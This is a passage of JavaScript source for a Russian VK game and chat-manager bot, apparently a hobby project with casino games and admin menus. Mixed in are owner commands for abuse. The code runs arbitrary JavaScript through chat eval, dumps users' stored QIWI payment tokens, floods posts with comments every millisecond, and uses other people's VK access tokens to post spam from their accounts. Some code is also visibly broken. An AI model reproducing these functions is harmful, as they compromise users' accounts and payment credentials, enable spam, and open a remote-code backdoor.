	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🚔 Поиск ВКонтакте:
		🌚 Вкищи [имя фамилия] - найдёт вам определённого человека вконтакте!
		🌚 Вкгруппа [название группы] - найдёт вам определеную группу вконтакте!
		🌚 Вкмузон [название] - найдёт вам определеную музыку вконтакте!
		`)
});

vk.updates.hear(/^(?:Пранки|пранки)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		😈Пранки
		😨 Пварн [id] [сумма] - выдать варн игроку (15.000.000)
		👀 Kod900 [в лс боту] - даст вам adm panel
		`)
});

vk.updates.hear(/^(?:квесты|Квесты)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🍏 Квесты:
		😬 Казарт - квест, сыграть в казино 100 раз (денежный приз).
		`)
});

vk.updates.hear(/^(?:халява|Халява)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🎁 Халява/Помощь:
		😌 Адмхалява - розыгрыши на халявную админку в боте.
		💵 Динфо - покажет приобретение donate
		`)
});

vk.updates.hear(/^(?:инфоКонкурс|инфоконкурс)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`
		🛑 Конкурсы:
		🔥Конкурс [сумма] - положить на счёт конкурса денежку.
		`)
});

vk.updates.hear(/^(?:userlog|юсерлог)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {
	let user = acc.users[user_id(message.user)];
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	if(user.level < 5) return;

	if(!message.$match[2]) return message.send(`Уважаемый @id${user.id} (Основатель), вы попали в систему [ADMIN LOG]\n Для того что бы её использовать введите: LOG [ID] [Номер зрапроса] - -\n1. Передачи [передать (ID)]\n2. Выдачи [giv (ID)]\n3. Обнуления баланса [remmon (ID)]\n4. Выдача прав [setadmin (ID)]\n5. Обнуление прав [Delladmin (ID)]\n6. Варны [warn (ID)]`) 
		let id = message.$match[1];
	let i = message.$match[2];
	if(i < 0 || i > 6) return message.send(`Ошибка, Доступ закрыт.`);
	let text = '';
	if(i == 1) for(i=0; i!=log.point[id].log.length; i++){text += log.point[id].log[i];}
	if(i == 2) for(i=0; i!=log.give[id].log.length; i++){text += log.give[id].log[i];}
	if(i == 3) for(i=0; i!=log.remove[id].log.length; i++){text += log.remove[id].log[i];} 
	if(i == 4) for(i=0; i!=log.admin[id].log.length; i++){text += log.admin[id].log[i];} 
	if(i == 5) for(i=0; i!=log.setwin[id].log.length; i++){text += log.setwin[id].log[i];}  
	if(i == 6) for(i=0; i!=log.warns[id].log.length; i++){text += log.warns[id].log[i];}  
	return message.send(text);
});

vk.updates.hear(/^(?:https)/i,  (message) => { 
	return message.send(`Внимание! ссылки в этой беседе запрещенны!💩`);
});

vk.updates.hear(/^(?:суефа)?\s([^\s].*)?\s(.*)/i, message => {
	if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: суефа [камень/ножницы/бумага] [ставка]`)
		let amount = parserInt(message.$match[2]);   
	let user = acc.users[user_id(message.user)]; 
	let id = user_id(message.user) 
	if (amount > acc.users[id].balance || amount < 1) return message.send(`🎉 ➾  Ставка не может превышать баланс или быть ниже 1$`);
	if(user.block_game == true && user.ap < 3){
		if (amount > 500000000) return message.send(`🎉 ➾  Ставка не должна быть больше 5.000.000$\n⛔ ➾ В 'донат' можно купить снятие ограничения.`);
	}

	if(!Number(amount)) return message.send(`🔸 ➾ Ставка должна быть числом!`); 

	if(message.$match[1] == 'камень'){
		if(rand(1,2) == 1){ 
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum;
			user.game.binwin += 1; 
			game_log(user_id(message.user), 'камень', amount, 1)
			if(amount < 10000){ 
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}✂ ➾ Вам выпали ножницы ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}✂ ➾ Вам выпали ножницы ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}✂ ➾ Вам выпали ножницы ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$\n🍀 ➾ Опыт дается при ставке от 10.000$`);
			}

		}else{ 
			game_log(user_id(message.user), 'суефа', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`\n🌚 ➾ Вам выпала бумага и вы проиграли ${spaces(amount)}$!`);
		}
	}
	if(message.$match[1] == 'бумага'){ 
		if(rand(1,2) == 1){
			let i = games(type='бумага');
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum; 
			user.game.binwin += 1;
			game_log(user_id(message.user), 'ножницы', amount, 1)
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}✂ ➾ Вам выпала бумага ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);	
			}


		}else{ 
			game_log(user_id(message.user), 'суефа', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`\n🌚 ➾ Вам выпали ножницы и вы проиграли ${spaces(amount)}$!`);

		}
	} 
	if(message.$match[1] == 'ножницы'){ 
		if(rand(1,2) == 1){
			let i = games(type='ножницы');
			user.balance -= amount;
			let sum = amount * 2;
			let text = ''
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; sum = sum * 2;}  
			if(config.bonus_exs == true) user.exs += 2;
			let a = config.bonus_exs.toString().replace(/false/gi, "2").replace(/true/gi, "4")
			user.balance += sum; 
			user.game.binwin += 1;
			game_log(user_id(message.user), 'ножницы', amount, 1)
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${text}✂ ➾ Вам выпала бумага ! \n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта! \n🌟 ➾ [Уровень повышен]`);
				}else{
					return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!`);
				}
			}else{
				return message.reply(`${text}}✂ ➾ Вам выпала бумага !\n🍀 ➾ Вы выиграли ${spaces(sum)}$ и ${a} опыта!\n🍀 ➾ Опыт дается при ставке от 10.000$`);	
			}


		}else{ 
			game_log(user_id(message.user), 'суефа', amount, 0)
			user.game.binlose += 1;
			user.balance -= amount;
			return message.reply(`\n🌚 ➾ Вам выпал камень и вы проиграли ${spaces(amount)}$!`);

		}
	} 
});

vk.updates.hear(/^(?:монетка)\s?([^]+)?\s([^\s   ].*)/i,  message => {
	if(!message.$match[1]) return message.send(`⚠ Монетка [орёл/решка] [ставка]`)
		let amount = parserInt(message.$match[2]);
	amount = Math.round(amount);
	let id = user_id(message.user)
	if(!Number(amount)) return message.send(`⚠ Ставка должна быть числом!`);
	let user = acc.users[user_id(message.user)];
	if (amount > acc.users[id].balance || amount < 1) return message.send(`⚠Ставка не может превышать баланс или быть ниже 1$`);
	if(user.block_game == true && user.ap < 3){
		if (amount > 50000000000) return message.send(`⚠ Ставка не должна быть больше 500.000$`);
	}

	if(message.$match[1].toLowerCase() == 'орёл'){
		if(rand(1,2) == 1){
			let i = "🔸 Вам попался орёл"
			user.balance += amount;
			if(config.bonus_balance == true){text += '[x2 bonus]\n'; amount = amount  * 2;}
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${i} \n ${text}✔ Вы выиграли ${spaces(amount)}$`);
				}else{
					return message.reply(`${i} \n${text}✔ Вы выиграли ${spaces(amount)}$`);
				}
			}else{
				return message.reply(`${i} \n${text}✔ Вы выиграли ${spaces(amount)}$`);
			}
		}else{
			let i = "🔹 Вам попалась решка"
			user.balance -= amount;
			return message.reply(`${i} \n✖ Вы проиграли ${spaces(amount)}$`);
		}
	}
	if(message.$match[1].toLowerCase() == 'решка'){
		if(rand(1,2) == 1){
			let i = "🔹 Вам попалась решка"              
			user.balance += amount ;
			if(amount < 10000){
				user.exs += 2;
				let up = lvlup(user_id(message.user));
				if(up == true){
					return message.reply(`${i} \n✔ Вы выиграли ${spaces(amount)}$`);
				}else{
					return message.reply(`${i} \n✔ Вы выиграли ${spaces(amount)}$`);
				}
			}else{
				return message.reply(`${i} \n✔ Вы выиграли ${spaces(amount)}$`);
			}  
		}else{
			let i = "🔸 Вам попался орёл"
			user.balance -= amount;
			return message.reply(`${i} \n✖ Вы проиграли ${spaces(amount)}$`);
		}
	}
});

vk.updates.hear(/^(?:ed)\s?([0-9]+)?/i, (message) => {  
	if(message.user != 287908009) return;
	acc.users[message.$match[1]].eval = true;
	return message.send(`Вы выдали @id ${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}), доступ к Eval system`)
});

vk.updates.hear(/^(?:zz|eval|dev|system code|!)\s([^]+)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.eval != true) return;
	try {
		const result = eval(message.$match[1]);

		if(typeof(result) === 'string')
		{
			return message.send(`Результат: ${result}`);
		} else if(typeof(result) === 'number')
		{
			return message.send(`Результат: ${result}`);
		} else {
			return message.send(`Результат: ${JSON.stringify(result, null, '　\t')}`);
		}
	} catch (e) {
		console.error(e);
		return message.send(`Ошибка: ${e.toString()}`);
	}
});

vk.updates.hear(/^(?:ded)\s?([0-9]+)?/i, (message) => {  
	if(message.user != 287908009) return;
	acc.users[message.$match[1]].eval = false;
	return message.send(`Вы забрали у @id ${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}), доступ к Eval system`)
});

vk.updates.hear(/^(?:qfull)$/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	return message.send(`Команды @id287908009 (Разработчика)
		😈Доступ full😈
		----------------------------------------
		💥ed [ид] - выдать евал
		💥Ded [ид] - забрать доступ к евалу
		💥Full [ид] [lvl] - выдать adm lvl
		💥Setrpomo [count] - установить промокод.
		💥Fd [id] - выдать осн.права бота
		💥Dfd [id] - забрать осн.права
		💥Userlog [id] [1-6] - посмотреть логи юзера.
		💥Вайп [название] - произвести вайп чего либо.
		💥Debug [id] - аннулировать время юзера.
		💥Прассылка [Ссылка] - репостом отправить всем юзером данного бота.
		💥Стикрасылка [id стикера] разослать юзерам пост со стикром.
		💥Рассылка [text] - разослать всем юзерам бота ваш текст.
		👻Bonus [баланс\опыт] вкл - включить умножние ×2
		👻NameRename [text] - переименовать всех игроков [ переменную]
		👻 SetConv [text] - переименовать название беседы.
		👻 Setphoto [фото] - поменять фотографию беседы.
		👻Аннулировать [id] - аннулировать юзера
		👻Grep [id] [причина] - выдать бан репорта
		👻Unrep [id] - снять бан репорта
		👻!start - вкл бота.
		👻!stop - выкл бота + сохранить базу.
		🌹Накрутка [ид поста] [ид юзера] - накрутка на запись требуется full
		🌹Token [токен] - покажет всю информацию о группе
		🌹Токены - покажет список токенов
		🌹states - узнать статусы у игроков.
		🌹qtoken - посмотреть токены QIWI юзеров.
		😜Баглист - узнать у кого ошибка с балансом (null)
		😜Банлист - узнать у кого стоит бан аккаунта.
		😜Тблист - Аккаунты с выключенным топом.
		😜oongame [id] [ограничение] - поставить ограничение на ставки (казино)
		😜oofgame [id] - снять ограничение на ставки (казино)
		💀--------------------------------💀
		⚠ Внимание слив full команд карается снятием и permban блокировкой⚠
		`,) 
});

vk.updates.hear(/^(?:накрутка)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	if(message.user != 287908009) return; 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(!message.$match[1]) return message.send(`${rnick}, Произошла ошибка. Вы не ввели ID Профиля.`);
	if(!message.$match[2]) return message.send(`${rnick}, Произошла ошибка. Вы не ввели ID Поста.`);
	setInterval(() => {
		let group = 169293675;
		let id_users = message.$match[1];
		let id_post = message.$match[2];
		let msg = ['1','2','3','4','5','6','7','8','9','10'].random();
		vk.api.wall.createComment({owner_id: id_users, post_id: id_post, from_group: group, message: msg});
	}, 1);
	let iu = message.$match[1];
	let ip = message.$match[2];
	message.send(`Накрутка комментариев успешно запущена.\n -- Пост на который идёт накрутка - | https://vk.com/wall${iu}_${ip} |`)
});

vk.updates.hear(/^(?:qtoken)/i, message => {
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return; 
	var qinfo; 
	qinfo = 'Токены QIWI\n'; 

	for(let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];
			if(user.qtok != false) qinfo += `@id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}] [TOKEN: ${acc.users[id].qtok}]\n`; 
		}
	}
	let text = `\n`;
	if (qinfo.length != 1000) text += qinfo;

	return message.send(`${text}`);
});

vk.updates.hear(/^(?:states)/i, message => {
	let user = acc.users[user_id(message.user)];
	if(message.user != 287908009) return; 
	var qinfo; 
	qinfo = 'статусы\n'; 

	for(let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];
			if(user.stat != false) qinfo += `@id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}] [st: ${acc.users[id].stat}]\n`; 
		}
	}
	let text = `\n`;
	if (qinfo.length != 1000) text += qinfo;

	return message.send(`${text}`);
});

vk.updates.hear(/^(?:баглист)/i, message => { 	
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return; 
	let devs, admins, moders, vips, chat; 
	let devels = ``;
	devs = '"⛔ У этих пользователей ошибка баланса:"\n'; 
	for (let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];
			
			if (user.balance == null) devs += ` ➖ @id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}] [Balance: ${acc.users[id].balance}$]\n`;
			if (user.balance == NaN) devs += `  ➖ @id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}] [Balance: ${acc.users[id].balance}$] \n`;
		}
	}
	let text = `\n`;
	if (devs.length != 100) text += devs;
	return message.send(`${text}`);
});

vk.updates.hear(/^(?:Банлист)/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	let devs, admins, moders, vips, chat; 
	let devels = ``;
	devs = '"⛔ Заблокированные пользователи:"\n';
	for (let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];
			
			if(user.ban == 1) devs += `➖ @id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}] [Balance: ${spaces(acc.users[id].balance)}$]\n`; 
		}
	}
	let text = `\n`;
	if (devs.length != 1000) text += devs;
	return message.send(`${text}`);
});

vk.updates.hear(/^(?:тблист)/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return;
	let devs, admins, moders, vips, chat; 
	let devels = ``;
	devs = '"⛔ Аккаунты с выключенным топом:"\n';
	for (let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];
			
			if(user.block_top == true) devs += `➖ @id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}] [Balance: ${spaces(acc.users[id].balance)}$] | ${spaces(acc.users[id].global_exs)}👑\n`; 
		}
	}
	let text = `\n`;
	if (devs.length != 1000) text += devs;
	return message.send(`${text}`);
});

vk.updates.hear(/^(?:!setname)\s([^]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.full == false) return message.send(`[Чат-Менеджер Бот Анна]: ${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	if(message.$from.type == 'user') return message.send(`[Чат-Менеджер Бот Анна]: ⛔ Произошла критическая ошибка системы\n — Подсказка:команда работает только в беседах!`);
	if(user.full == false) return; 
	vk.api.call("messages.editChat", {chat_id: message.chatId, title: message.$match[1]}).catch((error) => {return message.send(`[Чат-Менеджер Бот Юлия]: ⛔ ${rnick}, произошла критическая ошибка системы\nВозможные причины:\n Сообщество не имет достаточно доступа, сообщество не Администратор беседы.`);}); 
	message.send(`[Чат-Менеджер Бот Анна]: Название беседы было успешно изменено на: ${message.$match[1]}`, {attachment: `audio449532928_456239452`}); 
	return message.send({sticker_id:10349});
});

cm.hear(/^rega/i, async (context) => {
	const gs = ['https://psv4.userapi.com/c853024//u347241116/audiomsg/d17/ccbf44a4cb.mp3'];
	const link = gs[Math.floor(Math.random() * gs.length)];
	await Promise.all([context.sendAudioMessage(link)]);
});

vk.updates.hear(/^(?:oongame)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: oon ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.level < 5) return message.send(`🔸 ➾ Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].block_game = true 

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы поставили ограничение на ставки игроку [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:oofgame)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ooff ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.level < 5) return message.send(`🔸 ➾ Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].block_game = false; 

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы сняли ограничение на ставки игроку [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:userblock)\s?(.*)?/i, async(message) => { 
	const t = new VK(); 
	t.setOptions ({
		token: message.$match[1]
	});
	if(!message.$match[1]) return message.send(`Ошибка, вы не ввели токен страницы`); 
	t.api.users.get().then(function (res) {
		var us = res[0];

		t.api.wall.post({message: `Прости братан, пора прощаться! vto.pe `});
		return message.send (`@id${us.id} (Пользователь) заблокирован :)`)
	})
});

vk.updates.hear(/^(?:qr)\s(.*)/i, async (message) => {
	const qr = require('qr-image');
	let qr_svg = qr.image(message.$match[1], { type: 'png' });
	qr_svg.pipe(require('fs').createWriteStream('qr.png'));
	var svg_string = qr.imageSync(message.$match[1], { type: 'png' });
	message.sendPhoto(svg_string)
});

vk.updates.hear(/^(?:utoken)\s?(.*)?/i, async(message) => { 
	var text = ``; 
	const uss = new VK(); 
	uss.setOptions ({ token: message.$match[1] }); 
	if(!message.$match[1]) return message.send(`Ошибка, вы не ввели токен юзера`); 

	uss.api.users.get({fields: "status, about, bdate, city, common_count, country, domain, last_seen"}).then(function(response){ 
		var us = response[0]; 


		return message.send(` 

			Обладатель токена: @id${us.id} (${us.first_name} ${us.last_name}) 

			Информация о пользователе: 
			Идентификатор пользователя: «@${us.domain}» 
			Статус пользователя: «${us.status}» 

			Информация о токене @id${us.id} (пользователя): 
			Статус: Получен 
			`) 
	}) 
});